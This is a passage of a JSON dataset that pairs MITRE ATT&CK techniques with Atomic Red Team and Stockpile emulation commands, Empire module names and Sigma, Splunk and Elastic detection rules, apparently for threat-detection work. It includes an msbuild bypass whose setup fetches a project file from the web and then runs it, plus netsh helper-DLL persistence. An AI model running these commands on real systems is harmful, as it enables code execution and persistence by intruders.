user\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Audio Capture via SoundRecorder\nid: 83865853-59aa-449e-9600-74b9d89a6d6e\ndescription: Detect attacker collecting audio via SoundRecorder application\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/f72a98cb-7b3d-4100-99c3-a138b6e9ff6e.html\ntags:\n    - attack.collection\n    - attack.t1123\ndetection:\n    selection:\n        Image|endswith: '\\SoundRecorder.exe'\n        CommandLine|contains: '/FILE'\n    condition: selection\nfalsepositives:\n    - Legitimate audio capture by legitimate user\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\SoundRecorder.exe AND CommandLine.keyword:*\\\\/FILE*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Audio-Capture-via-SoundRecorder <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Audio Capture via SoundRecorder\",\\n    \"description\": \"Detect attacker collecting audio via SoundRecorder application\",\\n    \"tags\": [\\n      \"attack.collection\",\\n      \"attack.t1123\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\SoundRecorder.exe AND CommandLine.keyword:*\\\\\\\\/FILE*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\SoundRecorder.exe AND CommandLine.keyword:*\\\\\\\\/FILE*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Audio Capture via SoundRecorder\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\SoundRecorder.exe AND CommandLine.keyword:*\\\\/FILE*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\SoundRecorder.exe\" CommandLine=\"*/FILE*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\SoundRecorder.exe\" CommandLine=\"*/FILE*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\SoundRecorder\\\\.exe)(?=.*.*/FILE.*))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1124/T1124.yaml", "command": "net time \\\\localhost\nw32tm /tz\n", "name": null}, {"source": "atomics/T1124/T1124.yaml", "command": "Get-Date\n", "name": null}, {"source": "data/abilities/discovery/fa6e8607-e0b1-425d-8924-9b894da5a002.yml", "command": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"}}}, "name": "get current system time (ISO 8601)"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nC: \\ Windows \\ system32> net time \\\\ ICBC\nCurrent time \\\\ ICBC is 2019/11/10 20:09:50\n\nThe command completed successfully.", "name": "Dos"}, {"source": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "command": "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> w32tm / tz\nTime zone: Current: TIME_ZONE_ID_UNKNOWN deviating: -480 minutes (UTC = local time + Bias)\n[Standard name: \"China Standard Time\" partial amount: 0 Date :( unspecified)]\n[Daylight Saving Time Name: \"China Daylight Saving Time\" partial amount: -60 points :( date not specified)]", "name": "Dos"}], "command_list": ["net time \\\\localhost\nw32tm /tz\n", "Get-Date\n", {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"}}}, "Dos\nC: \\ Windows \\ system32> net time \\\\ ICBC\nCurrent time \\\\ ICBC is 2019/11/10 20:09:50\n\nThe command completed successfully.", "Dos\nMicrosoft Windows [Version 10.0.14393]\n(C) 2016 Microsoft Corporation. all rights reserved.\n\nC: \\ Users \\ Administrator> w32tm / tz\nTime zone: Current: TIME_ZONE_ID_UNKNOWN deviating: -480 minutes (UTC = local time + Bias)\n[Standard name: \"China Standard Time\" partial amount: 0 Date :( unspecified)]\n[Daylight Saving Time Name: \"China Daylight Saving Time\" partial amount: -60 points :( date not specified)]"], "technique_id": "T1124", "parsed_datasets": [{"Atomic Red Team Test - System Time Discovery": {"display_name": "System Time Discovery", "atomic_tests": [{"description": "Identify the system time\n", "supported_platforms": ["windows"], "name": "System Time Discovery", "input_arguments": {"computer_name": {"default": "localhost", "type": "string", "description": "computer name to query"}}, "executor": {"elevation_required": false, "command": "net time \\\\#{computer_name}\nw32tm /tz\n", "name": "command_prompt"}}, {"description": "Identify the system time via PowerShell\n", "supported_platforms": ["windows"], "name": "System Time Discovery - PowerShell", "executor": {"elevation_required": false, "command": "Get-Date\n", "name": "powershell"}}], "attack_technique": "T1124"}}, {"Mitre Stockpile - get current system time (ISO 8601)": {"platforms": {"windows": {"psh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'\n"}}, "darwin": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"}}, "linux": {"sh": {"parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.current.time"}]}, "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"}}}, "description": "get current system time (ISO 8601)", "tactic": "discovery", "technique": {"attack_id": "T1124", "name": "System Time Discovery"}, "id": "fa6e8607-e0b1-425d-8924-9b894da5a002", "name": "Get System Time"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"*\\\\net.exe\"and process_command_line contains \"*net* time*\")or process_path contains \"w32tm.exe\"or process_command_line contains \"*Get-Date*\"", "product": "Azure Sentinel", "name": "System Time Discovery"}, {"query": "title: Discovery of a system time\nid: b243b280-65fe-48df-ba07-6ddea7646427\ndescription: \"Identifies use of various commands to query a system\\u2019s time. This technique may be used before executing a scheduled task or to discover the time\\\n    \\ zone of a target system.\"\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1124/T1124.md\ntags:\n    - attack.discovery\n    - attack.t1124\ndetection:\n    selection:\n      - Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n      - Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n      - Image|endswith: '\\powershell.exe'\n        CommandLine|contains: 'Get-Date'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Discovery of a system time\nid: b243b280-65fe-48df-ba07-6ddea7646427\ndescription: \"Identifies use of various commands to query a system\\u2019s time. This technique may be used before executing a scheduled task or to discover the time\\\n    \\ zone of a target system.\"\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019/10/24\nmodified: 2019/11/11\nreferences:\n    - https://eqllib.readthedocs.io/en/latest/analytics/fcdb99c2-ac3c-4bde-b664-4b336329bed2.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1124/T1124.md\ntags:\n    - attack.discovery\n    - attack.t1124\ndetection:\n    selection:\n      - Image|endswith: \n            - '\\net.exe'\n            - '\\net1.exe'\n        CommandLine|contains: 'time'\n      - Image|endswith: '\\w32tm.exe'\n        CommandLine|contains: 'tz'\n      - Image|endswith: '\\powershell.exe'\n        CommandLine|contains: 'Get-Date'\n    condition: selection\nfalsepositives:\n    - Legitimate use of the system utilities to discover system time for legitimate reason\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:(*\\\\\\\\net.exe OR *\\\\\\\\net1.exe) AND CommandLine.keyword:*time*) OR (Image.keyword:*\\\\\\\\w32tm.exe AND CommandLine.keyword:*tz*) OR (Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\-Date*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Discovery-of-a-system-time <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Discovery of a system time\",\\n    \"description\": \"Identifies use of various commands to query a system\\\\u2019s time. This technique may be used before executing a scheduled task or to discover the time zone of a target system.\",\\n    \"tags\": [\\n      \"attack.discovery\",\\n      \"attack.t1124\"\\n    ],\\n    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*time*) OR (Image.keyword:*\\\\\\\\\\\\\\\\w32tm.exe AND CommandLine.keyword:*tz*) OR (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\\\\\-Date*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:(*\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe) AND CommandLine.keyword:*time*) OR (Image.keyword:*\\\\\\\\\\\\\\\\w32tm.exe AND CommandLine.keyword:*tz*) OR (Image.keyword:*\\\\\\\\\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\\\\\-Date*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Discovery of a system time\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:(*\\\\\\\\net.exe *\\\\\\\\net1.exe) AND CommandLine.keyword:*time*) OR (Image.keyword:*\\\\\\\\w32tm.exe AND CommandLine.keyword:*tz*) OR (Image.keyword:*\\\\\\\\powershell.exe AND CommandLine.keyword:*Get\\\\-Date*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Image=\"*\\\\\\\\net.exe\" OR Image=\"*\\\\\\\\net1.exe\") CommandLine=\"*time*\") OR (Image=\"*\\\\\\\\w32tm.exe\" CommandLine=\"*tz*\") OR (Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*Get-Date*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image IN [\"*\\\\\\\\net.exe\", \"*\\\\\\\\net1.exe\"] CommandLine=\"*time*\") OR (Image=\"*\\\\\\\\w32tm.exe\" CommandLine=\"*tz*\") OR (Image=\"*\\\\\\\\powershell.exe\" CommandLine=\"*Get-Date*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*.*\\\\net\\\\.exe|.*.*\\\\net1\\\\.exe))(?=.*.*time.*))|.*(?:.*(?=.*.*\\\\w32tm\\\\.exe)(?=.*.*tz.*))|.*(?:.*(?=.*.*\\\\powershell\\\\.exe)(?=.*.*Get-Date.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1124\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: net time * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ Windows \\ System32 \\ net.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: C: \\ Windows \\ system32 \\ net1 time * # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection3:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net1.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0selection4:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ net.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 1m # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: windows system service discovery\ndescription: windows server 2016\nreferences:\ntags: T1124\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: security\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4688 # have created a new process.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Newprocessname: 'C: \\ Windows \\ System32 \\ w32tm.exe' # process information> new process name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' # Process Information> Creator Process Name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Processcommandline: w32tm / tz # Process Information> process command line\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4689 # exited process\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0ProcessName: 'C: \\ Windows \\ System32 \\ w32tm.exe' # process information> process name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 5s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1126/T1126.yaml", "command": "net use c: \\\\test\\share\nnet share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No\n", "name": null}, {"source": "atomics/T1126/T1126.yaml", "command": "net share \\\\test\\share /delete\n", "name": null}, {"source": "atomics/T1126/T1126.yaml", "command": "Remove-SmbShare -Name \\\\test\\share\nRemove-FileShare -Name \\\\test\\share\n", "name": null}], "command_list": ["net use c: \\\\test\\share\nnet share test=\\\\test\\share /REMARK:\"test share\" /CACHE:No\n", "net share \\\\test\\share /delete\n", "Remove-SmbShare -Name \\\\test\\share\nRemove-FileShare -Name \\\\test\\share\n"], "technique_id": "T1126", "parsed_datasets": [{"Atomic Red Team Test - Remove Network Share": {"display_name": "Remove Network Share", "atomic_tests": [{"description": "Add a Network Share utilizing the command_prompt\n", "supported_platforms": ["windows"], "name": "Add Network Share", "input_arguments": {"share_name": {"default": "\\\\test\\share", "type": "string", "description": "Share to add."}}, "executor": {"elevation_required": false, "command": "net use c: #{share_name}\nnet share test=#{share_name} /REMARK:\"test share\" /CACHE:No\n", "name": "command_prompt"}}, {"description": "Removes a Network Share utilizing the command_prompt\n", "supported_platforms": ["windows"], "name": "Remove Network Share", "input_arguments": {"share_name": {"default": "\\\\test\\share", "type": "string", "description": "Share to remove."}}, "executor": {"elevation_required": false, "command": "net share #{share_name} /delete\n", "name": "command_prompt"}}, {"description": "Removes a Network Share utilizing PowerShell\n", "supported_platforms": ["windows"], "name": "Remove Network Share PowerShell", "input_arguments": {"share_name": {"default": "\\\\test\\share", "type": "string", "description": "Share to remove."}}, "executor": {"elevation_required": false, "command": "Remove-SmbShare -Name #{share_name}\nRemove-FileShare -Name #{share_name}\n", "name": "powershell"}}], "attack_technique": "T1126"}}], "queries": [{"query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"and process_command_line contains \"net delete\")or process_command_line contains \"Remove-SmbShare\"or process_command_line contains \"Remove-FileShare\"", "product": "Azure Sentinel", "name": "Network Share Connection Removal"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1127/T1127.yaml", "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe PathToAtomicsFolder\\T1127\\src\\T1127.csproj\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_executemsbuild", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/invoke_executemsbuild", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_ntsd", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/code_execution/invoke_ntsd", "name": "Empire Module Command"}], "command_list": ["C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe PathToAtomicsFolder\\T1127\\src\\T1127.csproj\n", "powershell/lateral_movement/invoke_executemsbuild", "powershell/lateral_movement/invoke_executemsbuild", "powershell/code_execution/invoke_ntsd", "powershell/code_execution/invoke_ntsd"], "technique_id": "T1127", "parsed_datasets": [{"Atomic Red Team Test - Trusted Developer Utilities": {"display_name": "Trusted Developer Utilities", "atomic_tests": [{"dependencies": [{"description": "Project file must exist on disk at specified location (#{filename})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/T1127.csproj\" -OutFile \"#{filename}\"\n", "prereq_command": "if (Test-Path #{filename}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "MSBuild Bypass Using Inline Tasks", "executor": {"elevation_required": false, "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe #{filename}\n", "name": "command_prompt"}, "description": "Executes the code in a project file using. C# Example\n", "input_arguments": {"filename": {"default": "PathToAtomicsFolder\\T1127\\src\\T1127.csproj", "type": "Path", "description": "Location of the project file"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1127"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1127", "Empire Module": "powershell/lateral_movement/invoke_executemsbuild", "Technique": "Trusted Developer Utilities", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/invoke_executemsbuild\":  [\"T1127\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1127", "Empire Module": "powershell/code_execution/invoke_ntsd", "Technique": "Trusted Developer Utilities", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/code_execution/invoke_ntsd\":  [\"T1127\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"MSBuild.exe\"or process_path contains \"msxsl.exe\")", "product": "Azure Sentinel", "name": "Trusted Developer Utilities"}, {"query": "title: Microsoft Workflow Compiler\nid: 419dbf2b-8a9b-4bea-bf99-7544b050ec8d\nstatus: experimental\ndescription: Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1127\nauthor: Nik Seetharaman\nreferences:\n    - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\Microsoft.Workflow.Compiler.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate MWC use (unlikely in modern enterprise environments)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Microsoft Workflow Compiler\nid: 419dbf2b-8a9b-4bea-bf99-7544b050ec8d\nstatus: experimental\ndescription: Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1127\nauthor: Nik Seetharaman\nreferences:\n    - https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\Microsoft.Workflow.Compiler.exe'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate MWC use (unlikely in modern enterprise environments)\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:*\\\\\\\\Microsoft.Workflow.Compiler.exe", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Microsoft-Workflow-Compiler <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Microsoft Workflow Compiler\",\\n    \"description\": \"Detects invocation of Microsoft Workflow Compiler, which may permit the execution of arbitrary unsigned code.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1127\"\\n    ],\\n    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\Microsoft.Workflow.Compiler.exe\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\Microsoft.Workflow.Compiler.exe\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Microsoft Workflow Compiler\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:*\\\\\\\\Microsoft.Workflow.Compiler.exe", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "Image=\"*\\\\\\\\Microsoft.Workflow.Compiler.exe\" | table CommandLine,ParentCommandLine", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\Microsoft.Workflow.Compiler.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\Microsoft\\\\.Workflow\\\\.Compiler\\\\.exe'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1128/T1128.yaml", "command": "netsh.exe add helper C:\\Path\\file.dll\n", "name": null}, {"source": "SysmonHunter - Netsh Helper DLL", "command": "\\SOFTWARE\\Microsoft\\NetSh", "name": null}, {"source": "SysmonHunter - Netsh Helper DLL", "command": "add|helper\\\\Windows\\\\.+\\\\netsh.exe", "name": null}], "command_list": ["netsh.exe add helper C:\\Path\\file.dll\n", "\\SOFTWARE\\Microsoft\\NetSh", "add|helper\\\\Windows\\\\.+\\\\netsh.exe"], "technique_id": "T1128", "parsed_datasets": [{"Atomic Red Team Test - Netsh Helper DLL": {"display_name": "Netsh Helper DLL", "atomic_tests": [{"description": "Netsh interacts with other operating system components using dynamic-link library (DLL) files\n", "supported_platforms": ["windows"], "name": "Netsh Helper DLL Registration", "input_arguments": {"helper_file": {"default": "C:\\Path\\file.dll", "type": "Path", "description": "Path to DLL"}}, "executor": {"command": "netsh.exe add helper #{helper_file}\n", "name": "command_prompt"}}], "attack_technique": "T1128"}}, {"SysmonHunter - T1128": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "\\SOFTWARE\\Microsoft\\NetSh"}}}, {"process": {"cmdline": {"pattern": "add|helper", "op": "and"}, "image": {"pattern": "\\\\Windows\\\\.+\\\\netsh.exe"}}, "type": "process"}], "description": null, "name": "Netsh Helper DLL", "level": "medium"}}], "queries": [{"query": "Sysmon| where 